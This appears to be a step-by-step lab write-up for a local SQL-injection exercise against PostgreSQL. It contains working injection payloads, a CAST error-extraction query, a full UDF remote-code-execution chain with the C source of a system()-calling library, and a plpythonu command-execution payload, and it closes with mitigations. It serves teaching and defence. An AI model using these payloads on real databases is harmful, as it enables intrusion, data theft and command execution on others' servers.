<h4>Step 1: Explore the Analytics Dashboard</h4>
<p>
    Start by testing the page filter with a known page name to understand the output.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home"<br><br>
        <span class="prompt">Response: </span>1 | /home | 15234
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>
    Test for injection by manipulating the query logic.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Injection Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home' AND 1=1 -- -"<br>
        <span class="prompt">Response: </span>1 | /home | 15234 (TRUE -- row returned)<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home' AND 1=2 -- -"<br>
        <span class="prompt">Response: </span>No analytics data found for that page. (FALSE -- no rows)
    </div>
</div>

<h4>Step 3: Error-Based Extraction with CAST</h4>
<p>
    Use the CAST technique to extract the master key from the hidden table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CAST Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=' AND 1=CAST((SELECT key_value FROM master_key LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_udf_c_funct10n_rc3}"
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{pg_udf_c_funct10n_rc3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=' AND 1=CAST((SELECT key_value FROM master_key LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_udf_c_funct10n_rc3}"
    </div>
</div>

<h4>Step 5: Understanding UDF RCE (Advanced Concept)</h4>
<p>
    PostgreSQL allows creating functions in C that are loaded from shared libraries.
    An attacker with sufficient privileges can upload a malicious <code>.so</code> file
    and register it as a function: achieving full Remote Code Execution.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. UDF Upload Chain (Conceptual)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step A: Create a large object to hold the malicious .so</span><br>
        <span class="prompt">Payload: </span>'; SELECT lo_creat(-1); -- -<br>
        <span class="prompt">Result: </span>Returns OID (e.g., 16444)<br><br>
        <span class="prompt">// Step B: Write the compiled C payload into the large object</span><br>
        <span class="prompt">Payload: </span>'; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (16444, 0, decode('7f454c46...', 'hex')); -- -<br>
        <span class="prompt">Note: </span>The hex string is a compiled .so with a sys() function<br><br>
        <span class="prompt">// Step C: Export the large object to disk</span><br>
        <span class="prompt">Payload: </span>'; SELECT lo_export(16444, '/tmp/evil.so'); -- -<br>
        <span class="prompt">Effect: </span>Writes the .so file to /tmp/evil.so<br><br>
        <span class="prompt">// Step D: Register the C function</span><br>
        <span class="prompt">Payload: </span>'; CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/evil.so', 'sys' LANGUAGE C STRICT; -- -<br>
        <span class="prompt">Effect: </span>Creates a callable SQL function backed by the C library<br><br>
        <span class="prompt">// Step E: Execute OS commands</span><br>
        <span class="prompt">Payload: </span>'; SELECT sys('id'); -- -<br>
        <span class="prompt">Effect: </span>Runs 'id' command as the postgres user
    </div>
</div>

<h4>Step 6: The C Payload Source</h4>
<p>
    The malicious shared library is typically a small C program that calls <code>system()</code>:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Malicious UDF Source (C)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// evil.c -- compile with: gcc -shared -fPIC -o evil.so evil.c</span><br><br>
        #include "postgres.h"<br>
        #include "fmgr.h"<br>
        #include &lt;stdlib.h&gt;<br><br>
        PG_MODULE_MAGIC;<br><br>
        PG_FUNCTION_INFO_V1(sys);<br>
        Datum sys(PG_FUNCTION_ARGS) {<br>
        &nbsp;&nbsp;char *cmd = PG_GETARG_CSTRING(0);<br>
        &nbsp;&nbsp;PG_RETURN_INT32(system(cmd));<br>
        }
    </div>
</div>

<h4>Step 7: Alternative. Using Existing Extensions</h4>
<p>
    Some PostgreSQL installations have pre-installed extensions that can be leveraged:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Pre-installed Extension Abuse</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Check available extensions</span><br>
        <span class="prompt">Payload: </span>' UNION SELECT 1, extname, extversion::text FROM pg_extension -- -<br><br>
        <span class="prompt">// If plpythonu is available:</span><br>
        <span class="prompt">Payload: </span>'; CREATE FUNCTION cmd(text) RETURNS text AS $$ import os; return os.popen(args[0]).read() $$ LANGUAGE plpythonu; -- -<br>
        <span class="prompt">Payload: </span>'; SELECT cmd('id'); -- -
    </div>
</div>

<h4>Step 8: Detection and Prevention</h4>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Mitigations</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>Never grant SUPERUSER or CREATE privileges to application accounts<br>
        <span class="prompt">2. </span>Use parameterized queries / prepared statements<br>
        <span class="prompt">3. </span>Disable untrusted language extensions (plpythonu, plperlu)<br>
        <span class="prompt">4. </span>Monitor pg_largeobject and pg_proc for unexpected changes<br>
        <span class="prompt">5. </span>Restrict filesystem access via pg_hba.conf and OS-level permissions<br>
        <span class="prompt">6. </span>Audit CREATE FUNCTION statements in query logs
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL's support for C-language User-Defined Functions
    creates a devastating RCE vector when combined with SQL injection and sufficient privileges.
    The attack chain: <code>lo_creat</code> to <code>lo_export</code> to
    <code>CREATE FUNCTION</code> -- allows writing arbitrary shared libraries to disk and
    loading them as database functions. Defense: restrict database user privileges, disable
    untrusted languages, and always use prepared statements.
</div>
